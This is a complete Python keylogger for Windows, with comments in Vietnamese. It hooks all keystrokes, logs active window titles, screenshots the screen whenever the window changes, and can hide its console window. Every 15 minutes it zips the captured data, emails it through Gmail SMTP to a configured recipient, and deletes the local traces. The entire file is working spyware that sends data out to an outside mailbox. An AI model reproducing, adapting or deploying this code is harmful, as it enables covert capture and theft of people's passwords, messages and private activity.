import os
import time
import threading
from datetime import datetime
import keyboard
import pygetwindow as gw
from PIL import ImageGrab
import ctypes
from ctypes import wintypes
import win32gui
import win32con
import win32api
import smtplib
import zipfile
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Cấu hình
VISIBLE = True  # True để hiện console, False để ẩn
BOOT_WAIT = True  # True để chờ boot xong
FORMAT = 0  # 0: mặc định, 10: decimal, 16: hex
MOUSE_IGNORE = True  # True để bỏ qua click chuột
EMAIL_INTERVAL = 15 * 60  # 15 phút (tính bằng giây)

# Email config từ .env
GMAIL_EMAIL = os.getenv('GMAIL_EMAIL')
GMAIL_PASSWORD = os.getenv('GMAIL_PASSWORD')
RECIPIENT_EMAIL = os.getenv('RECIPIENT_EMAIL')

# Mapping phím đặc biệt
KEY_MAPPING = {
    'backspace': '[BACKSPACE]',
    'enter': '\n',
    'space': '_',
    'tab': '[TAB]',
    'shift': '[SHIFT]',
    'ctrl': '[CTRL]',
    'alt': '[ALT]',
    'esc': '[ESCAPE]',
    'end': '[END]',
    'home': '[HOME]',
    'left': '[LEFT]',
    'right': '[RIGHT]',
    'up': '[UP]',
    'down': '[DOWN]',
    'page up': '[PG_UP]',
    'page down': '[PG_DOWN]',
    'caps lock': '[CAPSLOCK]',
    'delete': '[DELETE]',
    'insert': '[INSERT]',
}

class Keylogger:
    def __init__(self):
        self.output_file = None
        self.current_hour = -1
        self.last_window = ""
        self.running = False
        self.email_timer = None
        
        # Tạo folder captured nếu chưa có
        self.captured_folder = "captured"
        self.logs_folder = os.path.join(self.captured_folder, "logs")
        self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
        
        self.create_folders()
        self.validate_email_config()
        
    def create_folders(self):
        """Tạo các folder cần thiết"""
        try:
            os.makedirs(self.captured_folder, exist_ok=True)
            os.makedirs(self.logs_folder, exist_ok=True)
            os.makedirs(self.screenshots_folder, exist_ok=True)
            print(f"Created folders: {self.captured_folder}, {self.logs_folder}, {self.screenshots_folder}")
        except Exception as e:
            print(f"Error creating folders: {e}")
    
    def validate_email_config(self):
        """Kiểm tra cấu hình email"""
        if not all([GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL]):
            print("Warning: Email configuration incomplete. Email sending will be disabled.")
            print("Please check your .env file.")
            return False
        print(f"Email configuration validated. Will send to: {RECIPIENT_EMAIL}")
        return True
    
    def create_zip_archive(self):
        """Tạo file zip chứa toàn bộ folder captured"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            zip_filename = f"captured_data_{timestamp}.zip"
            
            # Tạo zip trong thư mục hiện tại (không trong captured folder)
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Thêm toàn bộ folder captured vào zip
                for root, dirs, files in os.walk(self.captured_folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        # Tạo đường dẫn tương đối trong zip
                        arcname = os.path.relpath(file_path, '.')
                        zipf.write(file_path, arcname)
                        print(f"Added to zip: {arcname}")
            
            print(f"Zip archive created: {zip_filename}")
            return zip_filename
        except Exception as e:
            print(f"Error creating zip archive: {e}")
            return None
    
    def send_email_with_attachment(self, zip_filepath):
        """Gửi email với file đính kèm"""
        try:
            print(f"Sending email to {RECIPIENT_EMAIL}...")
            
            # Tạo message
            msg = MIMEMultipart()
            msg['From'] = GMAIL_EMAIL
            msg['To'] = RECIPIENT_EMAIL
            msg['Subject'] = f"Keylogger Data - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Body email
            body = f"""
Keylogger Data Report

Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

This email contains captured data from the keylogger.

Files included:
- Log files from keyboard activity
- Screenshots from window changes

This is an automated message sent every 15 minutes.
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Đính kèm file zip
            if zip_filepath and os.path.exists(zip_filepath):
                with open(zip_filepath, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {os.path.basename(zip_filepath)}'
                )
                msg.attach(part)
                print(f"Attached file: {zip_filepath}")
            
            # Gửi email
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(GMAIL_EMAIL, GMAIL_PASSWORD)
            text = msg.as_string()
            server.sendmail(GMAIL_EMAIL, RECIPIENT_EMAIL, text)
            server.quit()
            
            print(f"Email sent successfully to {RECIPIENT_EMAIL}")
            return True
            
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def delete_captured_folder(self):
        """Xóa toàn bộ folder captured"""
        try:
            # Đóng file log hiện tại trước khi xóa
            if self.output_file:
                self.output_file.close()
                self.output_file = None
            
            # Xóa toàn bộ folder captured
            if os.path.exists(self.captured_folder):
                shutil.rmtree(self.captured_folder)
                print(f"Deleted folder: {self.captured_folder}")
            
            # Tạo lại folder structure
            self.create_folders()
            self.current_hour = -1  # Reset để tạo file log mới
            
        except Exception as e:
            print(f"Error deleting captured folder: {e}")
    
    def send_and_cleanup(self):
        """Zip, gửi email và cleanup"""
        try:
            print("\n" + "="*50)
            print("Starting email send and cleanup process...")
            
            # Kiểm tra xem có data để gửi không
            has_logs = os.path.exists(self.logs_folder) and os.listdir(self.logs_folder)
            has_screenshots = os.path.exists(self.screenshots_folder) and os.listdir(self.screenshots_folder)
            
            if not has_logs and not has_screenshots:
                print("No data to send")
                print("="*50 + "\n")
                return
            
            # Tạo zip archive
            zip_filepath = self.create_zip_archive()
            if not zip_filepath:
                print("Failed to create zip archive")
                print("="*50 + "\n")
                return
            
            # Gửi email
            email_sent = self.send_email_with_attachment(zip_filepath)
            
            if email_sent:
                print("Email sent successfully!")
                
                # Xóa file zip
                try:
                    os.remove(zip_filepath)
                    print(f"Deleted zip file: {zip_filepath}")
                except Exception as e:
                    print(f"Error deleting zip file: {e}")
                
                # Xóa folder captured
                self.delete_captured_folder()
                print("Cleanup completed successfully!")
            else:
                print("Failed to send email, keeping files")
                # Xóa zip file nếu gửi email thất bại
                try:
                    os.remove(zip_filepath)
                except:
                    pass
            
            print("="*50 + "\n")
                
        except Exception as e:
            print(f"Error in send_and_cleanup: {e}")
    
    def schedule_email_sending(self):
        """Lên lịch gửi email định kỳ"""
        if self.validate_email_config():
            self.send_and_cleanup()
        
        # Lên lịch lần tiếp theo
        if self.running:
            print(f"Next email scheduled in {EMAIL_INTERVAL//60} minutes...")
            self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
            self.email_timer.start()
        
    def setup_stealth(self):
        """Ẩn/hiện console window"""
        if not VISIBLE:
            # Ẩn cửa sổ console
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)
    
    def is_system_booting(self):
        """Kiểm tra hệ thống có đang boot không"""
        try:
            # Kiểm tra thời gian uptime
            uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
            return uptime < 120  # Nếu uptime < 2 phút thì coi như đang boot
        except:
            return False
    
    def wait_for_boot(self):
        """Chờ hệ thống boot xong"""
        if BOOT_WAIT:
            while self.is_system_booting():
                print("System is still booting up. Waiting 10 seconds...")
                time.sleep(10)
    
    def get_active_window_title(self):
        """Lấy title của cửa sổ đang active"""
        try:
            window = gw.getActiveWindow()
            if window:
                return window.title
        except:
            pass
        return ""
    
    def take_screenshot(self):
        """Chụp màn hình"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.screenshots_folder, filename)
            
            # Chụp toàn màn hình
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
            print(f"Screenshot saved: {filepath}")
        except Exception as e:
            print(f"Error taking screenshot: {e}")
    
    def process_key(self, key_event):
        """Xử lý phím được bấm"""
        try:
            # Lấy thời gian hiện tại
            now = datetime.now()
            
            # Kiểm tra cửa sổ active
            current_window = self.get_active_window_title()
            if current_window != self.last_window and current_window:
                self.take_screenshot()
                self.last_window = current_window
                timestamp_str = now.strftime("%Y-%m-%dT%H:%M:%S")
                self.write_to_log(f"\n\n[Window: {current_window} - at {timestamp_str}] ")
            
            # Xử lý phím
            key_str = self.format_key(key_event)
            if key_str:
                self.write_to_log(key_str)
                
        except Exception as e:
            print(f"Error processing key: {e}")
    
    def format_key(self, key_event):
        """Format phím thành string"""
        try:
            key_name = key_event.name.lower()
            
            # Bỏ qua mouse clicks nếu được cấu hình
            if MOUSE_IGNORE and key_name in ['left', 'right', 'middle']:
                return None
            
            if FORMAT == 10:
                return f'[{ord(key_name)}]'
            elif FORMAT == 16:
                return f'[{hex(ord(key_name))}]'
            else:
                # Format mặc định
                if key_name in KEY_MAPPING:
                    return KEY_MAPPING[key_name]
                elif len(key_name) == 1:
                    # Kiểm tra Caps Lock và Shift
                    caps_on = win32api.GetKeyState(win32con.VK_CAPITAL) & 1
                    shift_pressed = (win32api.GetKeyState(win32con.VK_SHIFT) & 0x8000) != 0
                    
                    if caps_on ^ shift_pressed:  # XOR
                        return key_name.upper()
                    else:
                        return key_name.lower()
                else:
                    return f'[{key_name.upper()}]'
                    
        except Exception as e:
            return f'[ERROR: {e}]'
    
    def write_to_log(self, text):
        """Ghi text vào file log"""
        try:
            now = datetime.now()
            
            # Kiểm tra nếu cần tạo file log mới (mỗi giờ)
            if self.current_hour != now.hour:
                if self.output_file:
                    self.output_file.close()
                
                self.current_hour = now.hour
                filename = now.strftime("%Y-%m-%d__%H-%M-%S.log")
                filepath = os.path.join(self.logs_folder, filename)
                self.output_file = open(filepath, 'a', encoding='utf-8')
                print(f"Logging to: {filepath}")
            
            # Ghi vào file
            if self.output_file:
                self.output_file.write(text)
                self.output_file.flush()
            
            # In ra console nếu visible
            if VISIBLE:
                print(text, end='')
                
        except Exception as e:
            print(f"Error writing to log: {e}")
    
    def on_key_event(self, key_event):
        """Callback khi có phím được bấm"""
        if key_event.event_type == keyboard.KEY_DOWN:
            self.process_key(key_event)
    
    def start(self):
        """Bắt đầu keylogger"""
        print("Starting keylogger...")
        
        # Setup stealth mode
        self.setup_stealth()
        
        # Chờ boot xong
        self.wait_for_boot()
        
        # Bắt đầu hook keyboard
        self.running = True
        keyboard.hook(self.on_key_event)
        
        # Bắt đầu timer gửi email
        if self.validate_email_config():
            print(f"Email sending scheduled every {EMAIL_INTERVAL//60} minutes")
            self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
            self.email_timer.start()
        
        print("Keylogger started. Press Ctrl+C to stop.")
        
        try:
            # Giữ chương trình chạy
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\nStopping keylogger...")
            self.stop()
    
    def stop(self):
        """Dừng keylogger"""
        self.running = False
        
        # Dừng timer email
        if self.email_timer:
            self.email_timer.cancel()
        
        # Gửi email cuối cùng trước khi tắt
        if self.validate_email_config():
            print("Sending final email before shutdown...")
            self.send_and_cleanup()
        
        keyboard.unhook_all()
        if self.output_file:
            self.output_file.close()
        
        print("Keylogger stopped.")

def main():
    keylogger = Keylogger()
    keylogger.start()

if __name__ == "__main__":
    main()